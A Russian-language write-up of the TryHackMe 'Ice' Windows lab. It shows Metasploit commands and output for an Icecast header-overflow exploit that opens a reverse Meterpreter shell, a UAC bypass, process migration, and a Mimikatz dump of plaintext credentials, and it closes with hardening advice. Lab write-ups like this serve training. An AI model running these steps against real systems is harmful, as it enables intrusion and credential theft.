# Ice

**Сложность:** Easy

<img width="100" height="100" alt="image" src="ССЫЛКА_НА_ИКОНКУ" />

| | |
|---|---|
| **Платформа** | TryHackMe |
| **ОС** | Windows |
| **Теги** | `metasploit`, `icecast`, `mimikatz`, `privesc` |

## Кратко

Windows-машина со службой Icecast streaming media server на порту 8000, уязвимой к переполнению заголовка. Эксплуатация через Metasploit дает начальный доступ, UAC обходится через `bypassuac_eventvwr`, после чего через Mimikatz (модуль kiwi) извлекаются учетные данные пользователя в открытом виде.

## 1. Разведка

### Сканирование портов

```bash
nmap -sS -sV 10.82.149.83
```

```
Nmap scan report for 10.82.149.83
Host is up (0.048s latency).
Not shown: 990 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http         Icecast streaming media server
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
49167/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Наиболее интересна служба на порту 8000 — Icecast streaming media server.

## 2. Получение доступа

Ищем эксплойт для Icecast в Metasploit:

```
msf > search icecast
```

```
#  Name                                 Disclosure Date  Rank   Check  Description
-  ----                                 ---------------  ----   -----  -----------
0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite
```

Выбираем эксплойт:

```
msf > use exploit/windows/http/icecast_header
```

```
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

Настраиваем `rhosts` и `lhost`, запускаем:

```
msf exploit(windows/http/icecast_header) > exploit
```

```
[*] Started reverse TCP handler on 192.168.129.112:4444
[*] Sending stage (190534 bytes) to 10.82.149.83
[*] Meterpreter session 1 opened (192.168.129.112:4444 -> 10.82.149.83:49211) at 2026-07-11 13:02:17 -0400
```

Получена сессия Meterpreter.

## 3. Повышение привилегий

Запускаем встроенный модуль поиска локальных эксплойтов:

```
run post/multi/recon/local_exploit_suggester
```

Среди предложенных — `exploit/windows/local/bypassuac_eventvwr`. Уводим текущую сессию в фон (`Ctrl+Z`) и переключаемся на найденный эксплойт:

```
use exploit/windows/local/bypassuac_eventvwr
```

В настройках указываем номер активной фоновой сессии и верный `lhost`, запускаем эксплойт. После успешного обхода UAC проверяем права в новой сессии Meterpreter:

```
getprivs
```

```
Enabled Process Privileges
==========================
SeBackupPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeLoadDriverPrivilege
SeRestorePrivilege
SeTakeOwnershipPrivilege
... (полный список привилегий)
```

Просматриваем процессы:

```
ps
```

Находим службу печати `spoolsv.exe`, запущенную от `NT AUTHORITY\SYSTEM`, и мигрируем в нее:

```
migrate -N spoolsv.exe
```

Загружаем модуль Mimikatz для расширения функционала сессии:

```
load kiwi
```

Извлекаем все учетные данные:

```
creds_all
```

```
[+] Running as SYSTEM
[*] Retrieving all credentials

wdigest credentials
===================
Username  Domain     Password
--------  ------     --------
Dark      Dark-PC    Password01!

tspkg credentials
=================
Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!
```

Пароль пользователя `Dark` получен в открытом виде: `Password01!`.

Дополнительные возможности полученной SYSTEM-сессии: `hashdump` — выгрузка базы SAM, `screenshare` — просмотр удаленного рабочего стола, `record_mic` — запись с микрофона; также доступен удаленный рабочий стол по добытым учетным данным.

<img width="1356" height="1097" alt="image" src="https://github.com/user-attachments/assets/57fbc406-956e-4254-88d9-ac6a58231660" />

## Выводы

- Устаревшая и уязвимая версия Icecast дает прямой RCE через Metasploit без необходимости ручного исследования.
- `bypassuac_eventvwr` — рабочий способ обойти UAC на Windows 7–10 и повысить сессию до полных привилегий.
- Пароль пользователя хранился в памяти в открытом виде и был извлечен через Mimikatz (`wdigest`/`tspkg`) — типичная проблема для систем без отключенного WDigest.
- Для защиты: обновить/заменить уязвимую службу Icecast, отключить WDigest-аутентификацию, своевременно патчить UAC bypass-векторы.

## Использованные инструменты

`nmap`, Metasploit (`msfconsole`), Mimikatz (`kiwi`)
